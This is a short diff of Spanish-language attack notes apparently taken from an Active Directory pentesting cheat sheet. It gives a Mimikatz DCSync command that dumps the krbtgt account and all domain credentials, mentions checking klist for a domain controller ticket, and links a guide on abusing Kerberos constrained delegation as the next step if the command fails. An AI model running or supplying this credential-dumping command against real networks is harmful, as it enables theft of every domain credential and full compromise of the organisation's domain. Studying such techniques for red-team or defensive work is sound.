@@ -9,3 +9,7 @@ Luego en el Klist tendría que salir el ticket del DC.
 Mimikatz
 
 lsadump::dcsync /user:<domain>\krbtgt /all /csv 
+
+
+Si no funciona:
+Concatenar lo anterior con esto: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation
